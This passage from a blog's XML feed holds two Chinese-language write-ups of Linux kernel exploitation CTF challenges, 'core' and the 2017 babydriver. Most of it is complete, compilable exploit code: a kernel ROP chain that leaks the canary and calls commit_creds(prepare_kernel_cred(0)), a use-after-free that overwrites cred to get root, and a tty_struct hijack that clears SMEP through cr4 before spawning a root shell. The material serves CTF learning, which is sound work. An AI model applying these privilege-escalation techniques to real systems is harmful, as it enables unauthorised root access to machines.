&amp;core_fops);core_fops是file_operation的结构体，它是linux调用的时候指定的函数，驱动加载的时候调用了init_module,导致我们写的一些函数都指向了驱动中的函数。这里注册了core_write、core_ioctl、core_release,通过这个结构体我们调用write就是调用core_write,ioctl就是调用core_ioctl.知道这些才能正确地编写exp，exp对应函数调用如下：void core_read(char *buf){    ioctl(fd,0x6677889B,buf);}void change_off(long long v1){    ioctl(fd,0x6677889c,v1);}void core_write(char *buf,int a3){    write(fd,buf,a3);}void core_copy_func(long long size){    ioctl(fd,0x6677889a,size);}rop编写rop思路流程：1.用canary绕过canary保护2.调用commit_creds（prepare_kernel_cred（0））提权3.回到用户态进行调用system(“/bin/sh”)来getshell4.最后修复环境。  注：建议用ropper找ROP，不然ROPgadget太慢    for(i = 0;i &lt; 8;i++){        rop[i] = 0x66666666;                //offset    }    rop[i++] = canary;                      //canary    rop[i++] = 0;                           //rbp(junk)    rop[i++] = vmlinux_base + 0xb2f;        //pop_rdi_ret;    rop[i++] = 0;                           //rdi    rop[i++] = prepare_kernel_cred_addr;    rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx_ret    rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx_ret    rop[i++] = vmlinux_base + 0x1aa6a;      //mov_rdi_rax_call_rdx    rop[i++] = commit_creds_addr;    rop[i++] = core_base + 0xd6;            //swapgs_ret    rop[i++] = 0;                           //rbp(junk)    rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret    rop[i++] = (size_t)shell;    rop[i++] = user_cs;    rop[i++] = user_eflags;    rop[i++] = user_sp;    rop[i++] = user_ss;EXP代码如下EXP程序流程：1.就是set_off设置off的值2.然后调用read泄漏地址3.在调用write写rop4.最后调用copy_copy_func实现栈溢出劫持控制流get_shell()//rop.c//gcc rop.c -o poc -w -static#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;int fd;void core_read(char *buf){    ioctl(fd,0x6677889B,buf);    //printf("[*]The buf is:%x\n",buf);}void change_off(long long v1){    ioctl(fd,0x6677889c,v1);}void core_write(char *buf,int a3){    write(fd,buf,a3);}void core_copy_func(long long size){    ioctl(fd,0x6677889a,size);}void shell(){    system("/bin/sh");}unsigned long user_cs, user_ss, user_eflags,user_sp	;void save_stats(){	asm(		"movq %%cs, %0\n"		"movq %%ss, %1\n"		"movq %%rsp, %3\n"		"pushfq\n"		"popq %2\n"		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) 		: 		: "memory" 	);}int main(){    int ret,i;    char buf[0x100];    size_t vmlinux_base,core_base,canary;    size_t commit_creds_addr,prepare_kernel_cred_addr;    size_t commit_creds_offset = 0x9c8e0;    size_t prepare_kernel_cred_offset = 0x9cce0;    size_t rop[0x100];    save_stats();    fd = open("/proc/core",O_RDWR);    change_off(0x40);    core_read(buf);    /*    for(i=0;i&lt;0x40;i++){    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&amp;buf[i]));    }    */    vmlinux_base = *(size_t *)(&amp;buf[0x20]) - 0x1dd6d1;  '''0x1dd6d1'''    core_base = *(size_t *)(&amp;buf[0x10]) - 0x19b;    prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;    commit_creds_addr = vmlinux_base + commit_creds_offset;    canary = *(size_t *)(&amp;buf[0]);    printf("[*]canary:%p\n",canary);    printf("[*]vmlinux_base:%p\n",vmlinux_base);    printf("[*]core_base:%p\n",core_base);    printf("[*]prepare_kernel_cred_addr:%p\n",prepare_kernel_cred_addr);    printf("[*]commit_creds_addr:%p\n",commit_creds_addr);    //junk    for(i = 0;i &lt; 8;i++){        rop[i] = 0x66666666;                //offset    }    rop[i++] = canary;                      //canary    rop[i++] = 0;                           //rbp(junk)    rop[i++] = vmlinux_base + 0xb2f;        //pop_rdi_ret;    rop[i++] = 0;                           //rdi    rop[i++] = prepare_kernel_cred_addr;    rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx_ret    rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx_ret    rop[i++] = vmlinux_base + 0x1aa6a;      //mov_rdi_rax_call_rdx    rop[i++] = commit_creds_addr;    rop[i++] = core_base + 0xd6;            //swapgs_ret    rop[i++] = 0;                           //rbp(junk)    rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret    rop[i++] = (size_t)shell;    rop[i++] = user_cs;    rop[i++] = user_eflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    core_write(rop,0x100);    core_copy_func(0xf000000000000100);    return 0;}0x04  总结这是我进入 Linux Kernel pwn 的敲门砖，自己当时听完觉得有点迷糊，看了代码的时候觉得很简单，但是当自己敲的时候又有很多问题不懂，只有当敲完一遍，把程序流程梳理了之后很多地方都清晰了。Linux 内核是很大的世界，要想完全理解，还要深入研究题目下载地址：https://github.com/Vinadiak/LinuxKernelPwn]]></content>
      <categories>
        
          <category> Linux-Kernel-Pwn </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux  Kernel  Pwn  UAF]]></title>
      <url>/linux-kernel-pwn/2020/09/15/Linux-Kernel-Pwn-UAF/</url>
      <content type="text"><![CDATA[0x01 背景知识UAF漏洞：UAF 漏洞是当我们 free 掉某个指针变量所指向的堆块的时候，未将该指针变量置0，导致该指针依然指着该堆块地址，当我们引用该指针的话，也就引用该指针所所指向的地址。这个漏洞对于开发者很容易忽略，但威力非常强大条件竞争：在多线程的环境下，当多个线程同时访问某一个共享代码、变量或文件的时候，就有可能发生条件竞争的漏洞，利用该漏洞可以产生意想不到的效果，不过有时候需要碰撞该漏洞才行，有一定失败几率。（在linux kernel pwn里面一般开了多线程就很有可能是利用条件竞争）cred：当我们fork一个新的进程的时候会产生cred结构体，在task_struct中大小为0xa8，注意当cred的uid,gid为0的话，我们就提权成功ptmx:当我们open(“/dev/ptmx”)的时候，会分配一个tty_operation的结构体,覆盖该结构体可以将控制流劫持到我们的代码中cr4：控制寄存器,功能之一开启关闭smep和smap保护，只要将cr4寄存器对应SMAP、SMEP保护位置为0即可关闭对应保护，常用mov,cr4,0x6f00x02 2017国赛 babydriver保护分析只开启了 nx 保护 只开启smep，不能ret2usr 逻辑分析ioctl：kfree 掉device_buf,kmalloc用户指定大小的堆块 babywrite：从用户的buf里面写入到device_buf,大小要小于堆块的大小 babyread **：将device_buf读入到用户指定的buf **babyrelease:kfree 掉指定的 device_buf,但没有置0，UAF 漏洞 0x03 编写EXPEXP思路1：1.fd1,fd2打开device2.fd1用ioctl 让 device 去 malloc 0xa8大小的堆块后free掉3.fork一个新的进程4.用fd2将device_buf全都置05.执行system(‘/bin/sh’)这里很多人可能看不明白3-5，详细讲下：linux kernel使用slab分配器来分配堆块，就像fastbin的后进先出一样，当我们fork一个新的进程后，会malloc一个0xa8大小的cred的结构体，此时slab会找到device_buf对应的堆块地址并分配给cred，只要我们用uaf将这个cred对应的uid，gid设置为0，则该进程对应的权限即为root权限，然后执行system(“/bin/sh”)就会得到shell了exp代码如下：一些编写exp的技巧我已写在上一篇文章中#include&lt;stdio.h&gt;#include&lt;fcntl.h&gt;#include &lt;unistd.h&gt;int main(){    int fd1,fd2,id;    char cred[0xa8] = {0};    fd1 = open("dev/babydev",O_RDWR);    fd2 = open("dev/babydev",O_RDWR);    ioctl(fd1,0x10001,0xa8);    close(fd1);    id = fork();    if(id == 0){        write(fd2,cred,28);        if(getuid() == 0){            printf("[*]welcome root:\n");            system("/bin/sh");            return 0;        }    }    else if(id &lt; 0){        printf("[*]fork fail\n");    }    else{        wait(NULL);    }    close(fd2);    return 0;}EXP思路2:关闭cr4，然后ret2usr1.fd1,fd2打开device2.fd1用ioctl 让 device 去 malloc 0x2e0大小的堆块后free掉3.fd3打开ptmx创建tty_struct到device_buf的地址4.fd2读取tty_struct到用户的buf中5.利用uaf，让fd2的重写tty_struct，将里面的tty_operation劫持到我们伪造的fake_tty_operation，fake_tty_operation放入rop，使用write的时候即可调用rop6.fd3执行write，调用tty_operation[3]，这里放入mov,rsp,rax执行栈劫持，rax是我们fake_tty_opeartion的结构体,就可以实现rop了 exp代码如下://poc.c//gcc poc.c -o poc -w -static#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;fcntl.h&gt;unsigned long user_cs, user_ss, user_eflags,user_sp;size_t commit_creds_addr = 0xffffffff810a1420;size_t prepare_kernel_cred_addr = 0xffffffff810a1810;void* fake_tty_opera[30]; void shell(){    system("/bin/sh");} void save_stats(){    asm(        "movq %%cs, %0\n"        "movq %%ss, %1\n"        "movq %%rsp, %3\n"        "pushfq\n"        "popq %2\n"        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)        :        : "memory"    );} void get_root(){    char* (*pkc)(int) = prepare_kernel_cred_addr;    void (*cc)(char*) = commit_creds_addr;    (*cc)((*pkc)(0));} int main(){    int fd1,fd2,fd3,i=0;    size_t fake_tty_struct[4] = {0};    size_t rop[20]={0};    save_stats();     rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret    rop[i++] = 0x6f0;    rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret    rop[i++] = 0x6161616161;    rop[i++] = (size_t)get_root;    rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret    rop[i++] = 0x6161616161;    rop[i++] = 0xffffffff814e35ef;      // iretq; ret;    rop[i++] = (size_t)shell;    rop[i++] = user_cs;    rop[i++] = user_eflags;    rop[i++] = user_sp;    rop[i++] = user_ss;     for(i = 0; i &lt; 30; i++)    {        fake_tty_opera[i] = 0xffffffff8181bfc5; //pop rax,pop rbp,ret    }    ////pop rax; pop rbp; ret;    fake_tty_opera[0] = 0xffffffff810635f5;         fake_tty_opera[1] = (size_t)rop;    //当调用write时，就会指向3，此时mov rsp,rax ; dec ebx ; ret    //执行完后，rsp=fake_tty_opera[0],就会执行从我们构造的栈，执行了。    fake_tty_opera[3] = 0xffffffff8181bfC5;        fake_tty_opera[7] = 0xffffffff8181bfc5;      fd1 = open("/dev/babydev",O_RDWR);    fd2 = open("/dev/babydev",O_RDWR);    ioctl(fd1,0x10001,0x2e0);    close(fd1);    fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);    read(fd2, fake_tty_struct, 32);    fake_tty_struct[3] = (size_t)fake_tty_opera;    write(fd2,fake_tty_struct, 32);    write(fd3,"cc-sir",6);                      //触发rop    return 0;}0x04 总结Linux Kernel Pwn不只是commit_creds(prepare_kernel_cred(0))这一条路，条条道路通罗马，要想对Linux Kernel完全渗透利用，必须要对Linux操作系统和内核源码理想透彻题目下载地址：https://github.com/Vinadiak/LinuxKernelPwn/tree/master/2017%20babydriver]]></content>
      <categories>
        
          <category> Linux-Kernel-Pwn </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
